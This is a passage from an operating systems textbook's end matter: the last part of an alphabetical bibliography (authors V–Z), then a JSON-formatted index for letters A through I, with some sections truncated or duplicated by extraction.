Shared-Memory Multiprocessors,’’ Proc. 13th Symp.\r\non Operating Systems Principles, ACM, pp. 26–40, 1991.\r\nVAN DER VEEN, V., DDUTT-SHARMA, N., CAVALLARO, L., and BOS, H.: ‘‘Memory\r\nErrors: The Past, the Present, and the Future,’’ Proc. 15th Int’l Conf. on Research in\r\nAttacks, Intrusions, and Defenses, Berlin: Springer-Verlag, pp. 86–106, 2012.\r\nVENKATA CHALAM, V., and FRANZ, M.: ‘‘Power Reduction Techniques for Microproces\u0002sor Systems,’’ Computing Surveys, vol. 37, pp. 195–237, Sept. 2005.\r\nVIENNOT, N., NAIR, S., and NIEH, J.: ‘‘Transparent Mutable Replay for Multicore Debug\u0002ging and Patch Validation,’’ Proc. 18th Int’l Conf. on Arc h. Support for Prog. Lang.\r\nand Operating Systems, ACM, 2013.\r\nVINOSKI, S.: ‘‘CORBA: Integrating Diverse Applications within Distributed Heteroge\u0002neous Environments,’’ IEEE Communications Magazine, vol. 35, pp. 46–56, Feb.\r\n1997.\r\nVISCAROLA, P.G, MASON, T., CARIDDI, M., RYAN, B., and NOONE, S.: Introduction to\r\nthe Windows Driver Foundation Kernel-Mode Framework, Amherst, NH: OSR Press,\r\n2007.\r\nVMWARE, Inc.: ‘‘ Achieving a Million I/O Operations per Second from a Single VMware\r\nvSphere 5.0 Host,’’ http://www.vmware.com/files/pdf/1M-iops-perf-vsphere5.pdf, 2011.\r\nVOGELS, W.: ‘‘File System Usage in Windows NT 4.0,’’ Proc. 17th Symp. on Operating\r\nSystems Principles, ACM, pp. 93–109, 1999.\r\nVON BEHREN, R., CONDIT, J., and BREWER, E.: ‘‘Why Events Are A Bad Idea (for High\u0002Concurrency Servers),’’ Proc. Ninth Workshop on Hot Topics in Operating Systems,\r\nUSENIX, pp. 19–24, 2003.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1067\r\nVON EICKEN, T., CULLER, D., GOLDSTEIN, S.C., and SCHAUSER, K.E.: ‘‘ Active Mes\u0002sages: A Mechanism for Integrated Communication and Computation,’’ Proc. 19th\r\nInt’l Symp. on Computer Arch., ACM, pp. 256–266, 1992.\r\nVOSTOKOV, D.: Windows Device Drivers: Practical Foundations, Opentask, 2009.\r\nVRABLE, M., SAVA GE, S., and VOELKER, G.M.: ‘‘BlueSky: A Cloud-Backed File System\r\nfor the Enterprise,’’ Proc. 10th USENIX Conf. on File and Storage Tech., USENIX, pp.\r\n124–250, 2012.\r\nWAHBE, R., LUCCO, S., ANDERSON, T., and GRAHAM, S.: ‘‘Efficient Software-Based\r\nFault Isolation,’’ Proc. 14th Symp. on Operating Systems Principles, ACM, pp.\r\n203–216, 1993.\r\nWALDSPURGER, C.A.: ‘‘Memory Resource Management in VMware ESX Server,’’ ACM\r\nSIGOPS Operating System Rev., vol 36, pp. 181–194, Jan. 2002.\r\nWALDSPURGER, C.A., and ROSENBLUM, M.: ‘‘I/O Virtualization,’’ Commun. of the\r\nACM, vol. 55, pp. 66–73, 2012.\r\nWALDSPURGER, C.A., and WEIHL, W.E.: ‘‘Lottery Scheduling: Flexible Proportional\u0002Share Resource Management,’’ Proc. First Symp. on Operating Systems Design and\r\nImplementation, USENIX, pp. 1–12, 1994.\r\nWALKER, W., and CRAGON, H.G.: ‘‘Interrupt Processing in Concurrent Processors,’’ Com\u0002puter, vol. 28, pp. 36–46, June 1995.\r\nWALLACE, G., DOUGLIS, F., QIAN, H., SHILANE, P., SMALDONE, S., CHAMNESS, M.,\r\nand HSU., W.: ‘‘Characteristics of Backup Workloads in Production Systems,’’ Proc.\r\n10th USENIX Conf. on File and Storage Tech., USENIX, pp. 33–48, 2012.\r\nWANG, L., KHAN, S.U., CHEN, D., KOLODZIEJ, J., RANJAN, R., XU, C.-Z., and ZOMAYA,\r\nA.: ‘‘Energy-Aware Parallel Task Scheduling in a Cluster,’’ Future Generation Com\u0002puter Systems, vol. 29, pp. 1661–1670, Sept. 2013b.\r\nWANG, X., TIPPER, D., and KRISHNAMURTHY, P.: ‘‘Wireless Network Virtualization,’’\r\nProc. 2013 Int’l Conf. on Computing, Networking, and Commun., IEEE, pp. 818–822,\r\n2013a.\r\nWANG, Y. and LU, P.: ‘‘DDS: A Deadlock Detection-Based Scheduling Algorithm for\r\nWorkflow Computations in HPC Systems with Storage Constraints,’’ Parallel Comput.,\r\nvol. 39, pp. 291–305, August 2013.\r\nWA TSON, R., ANDERSON, J., LAURIE, B., and KENNAW AY, K.: ‘‘ A Taste of Capsicum:\r\nPractical Capabilities for UNIX,’’ Commun. of the ACM, vol. 55, pp. 97–104, March\r\n2013.\r\nWEI, M., GRUPP, L., SPADA, F.E., and SWANSON, S.: ‘‘Reliably Erasing Data from Flash\u0002Based Solid State Drives,’’ Proc. Ninth USENIX Conf. on File and Storage Tech.,\r\nUSENIX, pp. 105–118, 2011.\r\nWEI, Y.-H., YANG, C.-Y., KUO, T.-W., HUNG, S.-H., and CHU, Y.-H.: ‘‘Energy-Efficient\r\nReal-Time Scheduling of Multimedia Tasks on Multi-core Processors,’’ Proc. 2010\r\nSymp. on Applied Computing, ACM, pp. 258–262, 2010.\n1068 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nWEISER, M., WELCH, B., DEMERS, A., and SHENKER, S.: ‘‘Scheduling for Reduced CPU\r\nEnergy,’’ Proc. First Symp. on Operating Systems Design and Implementation,\r\nUSENIX, pp. 13–23, 1994.\r\nWEISSEL, A.: Operating System Services for Task-Specific Power Management: Novel\r\nApproaches to Energy-Aware Embedded Linux, AV Akademikerverlag, 2012.\r\nWENTZLAFF, D., GRUENWALD III, C., BECKMANN, N., MODZELEWSKI, K., BELAY,\r\nA., YOUSEFF, L., MILLER, J., and AGARWAL, A.: ‘‘ An Operating System for Multi\u0002core and Clouds: Mechanisms and Implementation,’’ Proc. Cloud Computing, ACM,\r\nJune 2010.\r\nWENTZLAFF, D., JACKSON, C.J., GRIFFIN, P., and AGARWAL, A.: ‘‘Configurable Fine\u0002grain Protection for Multicore Processor Virtualization,’’ Proc. 39th Int’l Symp. on\r\nComputer Arch., ACM, pp. 464–475, 2012.\r\nWHITAKER, A., COX, R.S., SHAW, M, and GRIBBLE, S.D.: ‘‘Rethinking the Design of Vir\u0002tual Machine Monitors,’’ Computer, vol. 38, pp. 57–62, May 2005.\r\nWHITAKER, A., SHAW, M, and GRIBBLE, S.D.: ‘‘Scale and Performance in the Denali Iso\u0002lation Kernel,’’ ACM SIGOPS Operating Systems Rev., vol. 36, pp. 195–209, Jan.\r\n2002.\r\nWILLIAMS, D., JAMJOOM, H., and WEATHERSPOON, H.: ‘‘The Xen-Blanket: Virtualize\r\nOnce, Run Everywhere,’’ Proc. Seventh European Conf. on Computer Systems\r\n(EUROSYS), ACM, 2012.\r\nWIRTH, N.: ‘‘ A Plea for Lean Software,’’ Computer, vol. 28, pp. 64–68, Feb. 1995.\r\nWU, N., ZHOU, M., and HU, U.: ‘‘One-Step Look-Ahead Maximally Permissive Deadlock\r\nControl of AMS by Using Petri Nets,’’ ACM Trans. Embed. Comput. Syst. ,#, vol. 12,\r\nArt. 10, pp. 10:1–10:23, Jan. 2013.\r\nWULF, W.A., COHEN, E.S., CORWIN, W.M., JONES, A.K., LEVIN, R., PIERSON, C., and\r\nPOLLACK, F.J.: ‘‘HYDRA: The Kernel of a Multiprocessor Operating System,’’ Com\u0002mun. of the ACM, vol. 17, pp. 337–345, June 1974.\r\nYANG, J., TWOHEY, P., ENGLER, D., and MUSUVATHI, M.: ‘‘Using Model Checking to\r\nFind Serious File System Errors,’’ ACM Trans. on Computer Systems, vol. 24, pp.\r\n393–423, 2006.\r\nYEH, T., and CHENG, W.: ‘‘Improving Fault Tolerance through Crash Recovery,’’ Proc.\r\n2012 Int’l Symp. on Biometrics and Security Tech., IEEE, pp. 15–22, 2012.\r\nYOUNG, M., TEVANIAN, A., Jr., RASHID, R., GOLUB, D., EPPINGER, J., CHEW, J.,\r\nBOLOSKY, W., BLACK, D., and BARON, R.: ‘‘The Duality of Memory and Communi\u0002cation in the Implementation of a Multiprocessor Operating System,’’ Proc. 11th Symp.\r\non Operating Systems Principles, ACM, pp. 63–76, 1987.\r\nYUAN, D., LEWANDOWSKI, C., and CROSS, B.: ‘‘Building a Green Unified Computing IT\r\nLaboratory through Virtualization,’’ J. Computing Sciences in Colleges, vol. 28, pp.\r\n76–83, June 2013.\r\nYUAN, J., JIANG, X., ZHONG, L., and YU, H.: ‘‘Energy Aware Resource Scheduling Algo\u0002rithm for Data Center Using Reinforcement Learning,’’ Proc. Fifth Int’l Conf. on Intel\u0002ligent Computation Tech. and Automation, IEEE, pp. 435–438, 2012.\nSEC. 13.2 ALPHABETICAL BIBLIOGRAPHY 1069\r\nYUAN, W., and NAHRSTEDT, K.: ‘‘Energy-Efficient CPU Scheduling for Multimedia Sys\u0002tems,’’ ACM Trans. on Computer Systems, ACM, vol. 24, pp. 292–331, Aug. 2006.\r\nZACHARY, G.P.: Showstopper, New York: Maxwell Macmillan, 1994.\r\nZAHORJAN, J., LAZOWSKA, E.D., and EAGER, D.L.: ‘‘The Effect of Scheduling Disci\u0002pline on Spin Overhead in Shared Memory Parallel Systems,’’ IEEE Trans. on Parallel\r\nand Distr. Systems, vol. 2, pp. 180–198, April 1991.\r\nZEKAUSKAS, M.J., SAWDON, W.A., and BERSHAD, B.N.: ‘‘Software Write Detection for a\r\nDistributed Shared Memory,’’ Proc. First Symp. on Operating Systems Design and\r\nImplementation, USENIX, pp. 87–100, 1994.\r\nZHANG, C., WEI, T., CHEN, Z., DUAN, L., SZEKERES, L., MCCAMANT, S., SONG, D., and\r\nZOU, W.: ‘‘Practical Control Flow Integrity and Randomization for Binary Executa\u0002bles,’’ Proc. IEEE Symp. on Security and Privacy, IEEE, pp. 559–573, 2013b.\r\nZHANG, F., CHEN, J., CHEN, H., and ZANG, B.: ‘‘CloudVisor: Retrofitting Protection of\r\nVirtual Machines in Multi-Tenant Cloud with Nested Virtualization,’’ Proc. 23rd Symp.\r\non Operating Systems Principles, ACM, 2011.\r\nZHANG, M., and SEKAR, R.: ‘‘Control Flow Integrity for COTS Binaries,’’ Proc. 22nd\r\nUSENIX Security Symp., USENIX, pp. 337–352, 2013.\r\nZHANG, X., DAVIS, K., and JIANG, S.: ‘‘iTransformer: Using SSD to Improve Disk\r\nScheduling for High-Performance I/O,’’ Proc. 26th Int’l Parallel and Distributed Pro\u0002cessing Symp., IEEE, pp. 715-726, 2012b.\r\nZHANG, Y., LIU, J., and KANDEMIR, M.: ‘‘Software-Directed Data Access Scheduling for\r\nReducing Disk Energy Consumption,’’ Proc. 32nd Int’l Conf. on Distributed Computer\r\nSystems, IEEE, pp. 596–605, 2012a.\r\nZHANG, Y., SOUNDARARAJAN, G., STORER, M.W., BAIRAVASUNDARAM, L., SUB\u0002BIAH, S., ARPACI-DUSSEAU, A.C., and ARPACI-DUSSEAU, R.H.: ‘‘Warming Up Stor\u0002age-Level Caches with Bonfire,’’ Proc. 11th Conf. on File and Storage Technologies,\r\nUSENIX, 2013a.\r\nZHENG, H., ZHANG, X., WANG, E., WU, N., and DONG, X.: ‘‘ Achieving High Reliability\r\non Linux for K2 System,’’ Proc. 11th Int’l Conf. on Computer and Information Sci\u0002ence, IEEE, pp. 107–112, 2012.\r\nZHOU, B., KULKARNI, M., and BAGCHI, S.: ‘‘ ABHRANTA: Locating Bugs that Manifest\r\nat Large System Scales,’’ Proc. Eighth USENIX Workshop on Hot Topics in System\r\nDependability, USENIX, 2012.\r\nZHURAVLEV, S., SAEZ, J.C., BLAGODUROV, S., FEDOROVA, A., and PRIETO, M.: ‘‘Sur\u0002vey of scheduling techniques for addressing shared resources in multicore processors,’’\r\nComputing Surveys, ACM , vol 45, Number 1, Art. 4, 2012.\r\nZOBEL, D.: ‘‘The Deadlock Problem: A Classifying Bibliography,’’ ACM SIGOPS Operat\u0002ing Systems Rev., vol. 17, pp. 6–16, Oct. 1983.\r\nZUBERI, K.M., PILLAI, P., and SHIN, K.G.: ‘‘EMERALDS: A Small-Memory Real-Time\r\nMicrokernel,’’ Proc. 17th Symp. on Operating Systems Principles, ACM, pp. 277–299,\r\n1999.\n1070 READING LIST AND BIBLIOGRAPHY CHAP. 13\r\nZWICKY, E.D.: ‘‘Torture-Testing Backup and Archive Programs: Things You Ought to\r\nKnow But Probably Would Rather Not,’’ Proc. Fifth Conf. on Large Installation Sys\u0002tems Admin., USENIX, pp. 181–190, 1991."
      }
    }
  },
  "INDEX": {
    "page": 1104,
    "children": {
      "A": {
        "page": 1104,
        "content": "A\r\nAbsolute path, 776\r\nAbsolute path name, 277\r\nAbstraction, 982\r\nAccess, 116, 617, 657, 672, 801\r\nAccess control entry,\r\nWindows, 968\r\nAccess control list, 605–608, 874\r\nAccess to resources, 602–611\r\nAccess token, 967\r\nAccess violation, 936\r\nAccountability, 596\r\nACE (see Access Control Entry)\r\nAcknowledged datagram service, 573\r\nAcknowledgement message, 144\r\nAcknowledgement packet, 573\r\nACL (see Access Control List)\r\nACM Software System Award, 500\r\nACPI (see Advanced Configuration and\r\nPower Interface)\r\nActive attack, 600\r\nActive message, 556\r\nActiveX control, 678, 906\r\nActivity, Android, 827–831\r\nActivity manager, 827\r\nAda, 7\r\nAdapter, I/O, 339–340\r\nAddAccessAllowedAce, 970\r\nAddAccessDeniedAce, 970\r\nAdding a level of indirection, 500\r\nAddress space, 39, 41, 185–194\r\nAddress-space layout randomization,\r\n647–648, 973\r\nAdministrator, 41\r\nADSL (see Asymmetric Digital Subscriber Line)\r\nAdvanced configuration and power interface,\r\n425, 880\r\nAdvanced LPC, 890\r\nAdversary, 599\r\nAdware, 680\r\nAffinitized thread, 908\r\nAffinity, core, 551\r\nAffinity scheduling, multiprocessor, 541\r\nAgent, 697\r\nAging, 162, 214\r\nAIDL (see Android Interface Definition Language)\r\nAiken, Howard, 7\r\nAlarm, 118, 390, 739\r\nAlarm signal, 40\r\n1073\n1074 INDEX\r\nAlgorithmic paradigm, 989\r\nAllocating dedicated devices, 366\r\nALPC (see Advanced LPC)\r\nAlternate data stream, 958\r\nAmoeba, 610\r\nAnalytical engine, 7\r\nAndreesen, Marc, 77\r\nAndroid, 20, 802–849\r\nhistory, 803–807\r\nAndroid 1.0, 805\r\nAndroid activity, 827–831\r\nAndroid application, 824–836\r\nAndroid application sandbox, 838\r\nAndroid architecture, 809–810\r\nAndroid binder, 816–822\r\nAndroid binder IPC, 815–824\r\nAndroid content provider, 834–836\r\nAndroid Dalvik, 814–815\r\nAndroid design, 807–808\r\nAndroid extensions to Linux, 810–814\r\nAndroid framework, 810\r\nAndroid init, 809\r\nAndroid intent, 836–837\r\nAndroid interface definition language, 822\r\nAndroid open source project, 803\r\nAndroid out-of-memory killer, 813–814\r\nAndroid package, 825\r\nAndroid package manager, 826\r\nAndroid process lifecycle, 846\r\nAndroid process model, 844\r\nAndroid receiver, 833–834\r\nAndroid security, 838–844\r\nAndroid service, 831–833\r\nAndroid software development kit, 805\r\nAndroid suspend blocker, 810\r\nAndroid wake lock, 810–813\r\nAndroid zygote, 809–810, 815–816, 845–846\r\nAntivirus technique, 687–693\r\nbehavioral checker, 691–692\r\nintegrity checker, 691\r\nAOSP (see Android Open Source Project)\r\nAPC (see Asynchronous Procedure Call)\r\nAPK (see Android Package)\r\nAperiodic real-time system, 164\r\nAPI (see Application Programming Interface)\r\nApp, 36\r\nAppContainer, 866\r\nApple Macintosh (see Mac)\r\nApplet, 697\r\nApplication programming interface, 60, 483\r\nI/O in Windows, 945–948\r\nMemory management in Windows, 931–932\r\nNative NT, 868–871\r\nProcess management in Windows, 914–919\r\nSecurity in Windows, 969–970\r\nWin32, 60–62, 871–875\r\nApplication rootkit, 681\r\nApplication sandbox, Android, 838\r\nApplication verifier, 901\r\nArchitectural coherence, 987–988\r\nArchitecture, computer, 4\r\nArchive file, 269–270\r\nASLR (see Address Space Layout Randomization)\r\nAssociative memory, 202\r\nAsymmetric digital subscriber line, 771\r\nAsynchronous call, 554–556\r\nAsynchronous I/O, 352\r\nAsynchronous procedure call, 878, 885–886\r\nAT A, 29\r\nAtanasoff, John, 7\r\nAtomic action, 130\r\nAtomic transaction, 296\r\nAttack\r\nbuffer overflow, 640–642, 649\r\nbypassing ASLR, 647\r\ncode reuse, 645–646\r\ncommand injection, 655–656\r\ndangling pointer, 652–653\r\nformat string, 649–652\r\ninsider, 657–660\r\ninteger overflow, 654–655\r\nnoncontrol-flow div erting, 648–649\r\nnull pointer, 653–654\r\noutsider, 639–657\r\nreturn-oriented-programming, 645–647\r\nreturn-to-libc, 645\r\ntime of check to time of use, 656–657\r\nTOCTOU, 656–657\r\nAttacker, 599\r\nAttribute, file, 271\r\nAuthentication, 626–638\r\npassword, 627–632\r\nAuthentication for message passing, 144\r\nAuthentication using biometrics, 636–638\r\nAuthentication using physical objects, 633–636\r\nAuthenticity, 596\r\nAutomounting, NFS, 794\r\nAV disk, 385\r\nAv ailability, 596\r\nAv ailable resource vector, 446\nINDEX 1075"
      },
      "B": {
        "page": 1106,
        "content": "B\r\nB programming language, 715\r\nBabbage,"
      },
      "C": {
        "page": 1107,
        "content": "C\r\nC language, introduction, 73–77\r\nC preprocessor, 75\r\nC programming language, 715\r\nC-list, 608\r\nCA (see Certification Authority)\r\nCache, 100\r\nLinux, 772\r\nWindows, 942–943\r\nwrite-through, 317\r\nCache (L1, L2, L3), 527\r\nCache hit, 25\r\nCache line, 25, 521\r\nCache manager, 889\r\nCache-coherence protocol, 521\r\nCache-coherent NUMA, 525\r\nCaching, 1015\r\nfile system, 315–317\r\nCanonical mode, 395\r\nCapability, 608–611\r\nAmoeba, 610\r\ncryptographically protected, 609\r\nHydra, 610\r\nIBM AS/400, 609\r\nkernel, 609\r\ntagged architecture, 609\r\nCapability list, 608\r\nCapacitive screen, 415\r\nCarriero, Nick, 584\r\nCathode ray tube, 340\r\nCavity virus, 668\r\nCC-NUMA (see Cache-Coherent NUMA)\r\nC"
      },
      "D": {
        "page": 1108,
        "content": "D"
      },
      "E": {
        "page": 1110,
        "content": "EX 1079\r\nDisco, 474\r\nDiscretionary access control, 612\r\nDiscretionary ACL, 967\r\nDisk, 27–28, 49–50\r\nDisk controller cache, 382\r\nDisk driver, 4\r\nDisk error handling, 382–385\r\nDisk formatting, 375–379\r\nDisk hardware, 369–375\r\nDisk interleaving, 378\r\nDisk operating system, 15\r\nDisk properties, 370\r\nDisk quota, 305–306\r\nDisk recalibration, 384\r\nDisk scheduling algorithms, 379–382\r\nelevator, 380–382\r\nfirst-come, first-served, 379–380\r\nshortest seek first, 380\r\nDisk-arm motion, 318–319\r\nDisk-space management, 300–306\r\nDisks, 369–388\r\nDispatcher object, 883, 886–887\r\nDispatcher thread, 100\r\nDispatcher header, 886\r\nDistributed operating system, 18–19\r\nDistributed shared memory, 233, 558–563\r\nDistributed system, 519, 566–587\r\nloosely coupled, 519\r\ntightly coupled, 519\r\nDLL (see Dynamic Link Library)\r\nDLL hell, 905\r\nDMA (see Direct Memory Access)\r\nDMI (see Direct Media Interface)\r\nDNS (see Domain Name System)\r\nDocument-based middleware, 576–577\r\nDomain 492, 603\r\nDomain name system, 575\r\nDOS (see Disk Operating System)\r\nDouble buffering, 364\r\nDouble indirect block, 324, 789\r\nDouble interleaving, 378\r\nDouble torus, multicomputer, 547\r\nDown operation on semaphore, 130\r\nDPC (see Deferred Procedure Call)\r\nDrive-by download, 639, 677\r\nDriver, disk, 4\r\nDriver object, 870\r\nWindows, 944\r\nDriver verifier, 948\r\nDriver-kernel interface, Linux, 772\r\nDRM (see Digital Rights Management)\r\nDSM (see Distributed Shared Memory)\r\nDual-use technology, 597\r\nDump, file system, 306–311\r\nDuplicateHandle, 918\r\nDynamic binary translation, 503\r\nDynamic disk, Windows, 944\r\nDynamic fair-share scheduling, 927\r\nDynamic link library, 63, 229, 862, 905–908\r\nDynamic relocation, 186\r\nE\r\ne-Cos, 185\r\nEarly binding, 1001\r\nECC (see Error-Correcting Code)\r\nEchoing, 396\r\nEckert, J. Presper, 7\r\nEEPROM (see Electrically Erasable PROM)\r\nEffective UID, 800\r\nEfficiency, hypervisor, 475\r\nE"
      },
      "F": {
        "page": 1111,
        "content": "FAT file system, 266\r\nExisting resource vector, 446\r\nExit, 56, 90, 91, 696, 738, 54\r\nExitProcess, 91\r\nExokernel, 73, 995\r\nExplicit intent, Android, 836\r\nExploit, 594\r\nExploiting locality, 1017\r\nExploiting software, 639–657\r\nExt2 file system, 320, 785–790\r\nExt3 file system, 320, 790\r\nExt4 file system, 790–792\r\nExtended page table, 488\r\nExtensible system, 997\r\nExtent, 284, 791\r\nExternal fragmentation, 243\r\nExternal pager, 239–240\r\nF\r\nFair-share scheduling, 163–164\r\nFailure isolation, 983\r\nFalse sharing in DSM, 561\r\nFAT (see File Allocation Table)\r\nFAT-16 file system, 265, 952\r\nFAT-32 file system, 265, 952\r\nFCFS (see First-Come, First-Served algorithm)\r\nFcntl, 783\r\nFiber, Windows, 909–911\r\nFiber management API calls in Windows,\r\n914–919\r\nFidelity, hypervisor, 475\r\nFIFO (see First-In, First-Out page\r\nreplacement)\r\nFile, 41–44, 264\r\nblock special, 768\r\ncharacter special, 768\r\nFile access, 270–271\r\nFile allocation table, 285, 285–286\r\nFile attribute, 271, 271–272\r\nFile compression, NTFS, 962–963\r\nFile data structure, Linux, 785\r\nFile descriptor, 43, 275, 781\r\nFile encryption, NTFS, 963–964\r\nFile extension, 266–267\r\nFile handle, NFS, 794\r\nFile key, 268\r\nFile link, 291\r\nFile management system calls, 56–57\r\nFile mapping, 873\r\nFile metadata, 271\r\nFile naming, 265–267\r\nFile operation, 272–273\r\nFile sharing, 580–582\r\nFile structure, 267–268\r\nFile system, 263–332\r\nCD-ROM, 325–331\r\ncontiguous allocation, 282–283\r\nExFAT\r\next2, 320, 785–790\r\next3, 320, 295\r\next4, 790–792\r\nFAT, 285–286\r\nFAT-16, 952\r\nFAT-32, 952\r\nISO 9660, 326–331\r\nJoliet, 330–331\r\njournaling, 295–296\r\nlinked-list allocation, 284–285\r\nLinux, 775–798\r\nMS-DOS, 320–323\r\nnetwork, 297\r\nNTFS, 295, 95–964\r\nRock Ridge, 329–331\r\nUNIX V7, 323–325\r\nvirtual, 296–299\r\nWindows, 952–964\r\nFile-system backup, 306–311\r\nFile-system block size, 300–302\r\nFile-system calls in Linux, 780–783\r\nFile-system cache, 315–317\r\nFile-system consistency, 312–314\r\nFile-system examples, 320–331\r\nFile-system filter driver, 892\nINDEX 1081\r\nFile-system fragmentation, 283–284\r\nFile-system implementation, 281–299\r\nFile-system layout, 281–282\r\nFile-system management, 299–320\r\nFile-system performance, 314–319\r\nFile-system structure,\r\nWindows NT, 954–958\r\nLinux, 785–792\r\nFile-system-based middleware, 577–582\r\nFile type, 268–270\r\nFile usage, example, 273–276\r\nFilter, 892\r\nFilter driver, Windows, 952\r\nFinger daemon, 675\r\nFinite-state machine, 102\r\nFirewall, 685–687\r\npersonal, 687\r\nstateful, 687\r\nstateless, 686\r\nFirmware, 893\r\nFirmware rootkit, 680\r\nFirst fit algorithm, 192\r\nFirst-come, first-served disk scheduling, 379–380\r\nfirst-served scheduling, 156–157\r\nFirst-in, first-out page replacement algorithm, 211\r\nFlash device, 909\r\nFlash memory, 26\r\nFlashing, 893\r\nFloppy disk, 370\r\nFly-by mode, 346\r\nFolder, 276\r\nFont, 413–414\r\nFork, 53, 53–55, 54, 55, 61, 82, 89, 90, 106,\r\n107, 228, 462, 463, 534, 718, 734, 736,\r\n737, 741, 742, 743, 744, 745, 763, 815,\r\n844, 845, 851, 852\r\nFormal security model, 611–619\r\nFormat string attack, 649–651\r\nFormatting, disk, 375–379\r\nFORTRAN, 9\r\nFragmentation, file systems, 283–284\r\nFree, 653\r\nFree block management, 303–305\r\nFreeBSD, 18\r\nFsck, 312\r\nFstat, 57, 782\r\nFsuid, 854\r\nFsync, 767\r\nFull virtualization, 476\r\nFunction pointer in C, 644\r\nFundamental concepts of Windows security, 967\r\nFutex, 134–135"
      },
      "G": {
        "page": 1112,
        "content": "G\r\nGabor wav elet, 637\r\nGadget, 646\r\nGang scheduling, multiprocessor, 543–545\r\nGasse´e, Jean-Louis, 405\r\nGates, Bill, 14, 858\r\nGCC (see Gnu C compiler)\r\nGDI (see Graphics Device Interface)\r\nGDT (see Global Descriptor Table)\r\nGelernter, David, 584\r\nGeneral-purpose GPU, 529\r\nGeneric right, capability, 610\r\nGetpid, 734\r\nGetTokenInformation, 967\r\nGetty, 752\r\nGhosting, 415\r\nGID (see Group ID)\r\nGlobal descriptor table, 249\r\nGlobal page replacement, 223–224\r\nGlobal variable, 116\r\nGnome, 18\r\nGNU C compiler, 721\r\nGNU Public License, 722\r\nGoals of I/O software, 351–352\r\nGoals of operating system design, 982–983\r\nGoat file, 687\r\nGoldberg, Robert, 474\r\nGoogle Play, 807\r\nGPGPU (see General-Purpose GPU)\r\nGPL (see GNU Public License)\r\nGPT (see GUID Partition Table)\r\nGPU (see Graphics Processing Unit)\r\nGrace period, 148\r\nGrand unified bootloader, 751\r\nGraph-theoretic processor allocation, 564–565\r\nGraphical user interface, 1–2, 16, 405–414, 719, 802\r\nGraphics adapter, 405\r\nGraphics device interface, 410\r\nGraphics processing unit, 24, 529\r\nGrid, multicomputer, 547\r\nGroup, ACL, 606\r\nGroup ID, 40, 604, 799\r\nGRUB (see GRand Unified Bootloader)\r\nGuaranteed scheduling algorithm, 162\n1082 INDEX\r\nGuest operating system, 72, 477, 505\r\nGuest physical address, 488\r\nGuest virtual address, 488\r\nGuest-induced page fault, 487\r\nGUI (see Graphical User Interface)\r\nGUID partition table, 378"
      },
      "H": {
        "page": 1113,
        "content": "H\r\nHacker, 597\r\nHAL (see Hardware Abstraction Layer)\r\nHandheld computer operating system, 36\r\nHandle, 92, 868, 897–898\r\nHard fault, 936\r\nHard link, 281\r\nHard miss, 204\r\nHard real-time system, 38, 164\r\nHardening, 600\r\nHardware abstraction layer, 878–882, 880\r\nHardware issues for power management, 418–419\r\nHardware support, nested page tables, 488\r\nHardware-independent encapsulation, 507\r\nHead skew, 376\r\nHeader file, 74\r\nHeadless workstation, 546\r\nHeap, 755\r\nHeap feng shui, 653\r\nHeap spraying, 642\r\nHeterogeneous multicore chip 529–530\r\nHibernation, 964\r\nHiding the hardware, 1005\r\nHierarchical directory structure, 276–277\r\nHierarchical file system, 276–277\r\nHigh-level format of disk, 379\r\nHigh-resolution timer, Linux, 747\r\nHint, 1016\r\nHistory of disks, 49\r\nHistory of memory, 48\r\nHistory of operating systems, 6–20\r\nAndroid, 803–807\r\nfifth generation, 19–20\r\nfirst generation, 7–8\r\nfourth generation, 15–19\r\nLinux, 714–722\r\nM"
      },
      "I": {
        "page": 1113,
        "content": "INDEX\r\nGuest operating system, 72, 477, 505\r\nGuest physical address, 488\r\nGuest virtual address, 488\r\nGuest-induced page fault, 487\r\nGUI (see Graphical User Interface)\r\nGUID partition table, 378\r\nH\r\nHacker, 597\r\nHAL (see Hardware Abstraction Layer)\r\nHandheld computer operating system, 36\r\nHandle, 92, 868, 897–898\r\nHard fault, 936\r\nHard link, 281\r\nHard miss, 204\r\nHard real-time system, 38, 164\r\nHardening, 600\r\nHardware abstraction layer, 878–882, 880\r\nHardware issues for power management, 418–419\r\nHardware support, nested page tables, 488\r\nHardware-independent encapsulation, 507\r\nHead skew, 376\r\nHeader file, 74\r\nHeadless workstation, 546\r\nHeap, 755\r\nHeap feng shui, 653\r\nHeap spraying, 642\r\nHeterogeneous multicore chip 529–530\r\nHibernation, 964\r\nHiding the hardware, 1005\r\nHierarchical directory structure, 276–277\r\nHierarchical file system, 276–277\r\nHigh-level format of disk, 379\r\nHigh-resolution timer, Linux, 747\r\nHint, 1016\r\nHistory of disks, 49\r\nHistory of memory, 48\r\nHistory of operating systems, 6–20\r\nAndroid, 803–807\r\nfifth generation, 19–20\r\nfirst generation, 7–8\r\nfourth generation, 15–19\r\nLinux, 714–722\r\nMINIX, 719–720\r\nsecond generation, 8–9\r\nthird generation, 9–14\r\nWindows, 857–865\r\nHistory of protection hardware, 58\r\nHistory of virtual memory, 50\r\nHistory of virtualization, 473–474\r\nHistory of VMware, 498–499\r\nHive, 875\r\nHoare, C.A.R, 137\r\nHoneypot, 697\r\nHost, 461, 571\r\nHost operating system, 72, 477, 508\r\nHost physical address, 488\r\nHosted hypervisor, 478\r\nHuge page, Linux, 763\r\nHungarian notation, 408\r\nHybrid thread, 112–113\r\nHydra, 610\r\nHyper-V, 474, 879\r\nHypercall, 477, 483\r\nHypercube, multicomputer, 547\r\nHyperlink, 576\r\nHyperthreading, 23–24\r\nHypervisor, 472, 475, 879\r\nhosted, 478\r\ntype 1, 70–72, 477–478\r\ntype 2, 70, 477–478, 481\r\nHypervisor rootkit, 680\r\nHypervisor-induced page fault, 487\r\nHypervisors vs. microkernels, 483–485\r\nI\r\nI-node, 58, 286–287, 325, 784\r\nI-node table, 788\r\nI-space, 227\r\nI/O, interrupt driven\r\nI/O API calls in Windows, 945–948\r\nI/O completion port, 948\r\nI/O device, 28–31, 338\r\nI/O hardware, 337–351\r\nI/O in Linux, 767–775\r\nI/O in Windows, 943–952\r\nI/O manager, 888\r\nI/O MMU, 491\r\nI/O port, 341\r\nI/O port space, 30, 341\r\nI/O request packet, 902, 950\r\nI/O scheduler, Linux, 773\r\nI/O software, 351–355\r\nuser-space, 367–369\nINDEX 1083\r\nI/O software layers, 356–369\r\nI/O system calls in Linux, 770–771\r\nI/O system layers, 368\r\nI/O using DMA, 355\r\nI/O virtualization, 490–493\r\nI/O-bound process, 152\r\nIAAS (see Infrastructure As A Service)\r\nIAT (see Import Address Table)\r\nIBinder, Android, 821\r\nIBM 